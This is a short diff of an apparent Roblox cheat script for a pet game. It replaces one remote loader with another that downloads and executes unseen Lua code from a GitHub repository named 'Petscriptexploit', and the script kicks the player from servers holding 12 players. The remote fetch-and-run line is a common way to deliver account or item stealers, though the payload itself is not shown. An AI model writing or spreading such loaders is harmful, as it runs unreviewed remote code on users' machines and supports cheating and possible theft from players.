@@ -813,7 +813,8 @@ end
 if #game:GetService("Players"):GetPlayers() == 12 then
     game.Players.LocalPlayer:Kick("This server is unsupported... Try in a new PUBLIC server.")
 end
-loadstring(game:HttpGet("https://pastefy.app/Hco15aT5/raw"))()
+--loadstring(game:HttpGet("https://pastefy.app/Hco15aT5/raw"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Petscriptexploit/PetsimScript/refs/heads/main/message%20(1)%20(1)-1%20(1).txt"))()
 local LP = game.Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
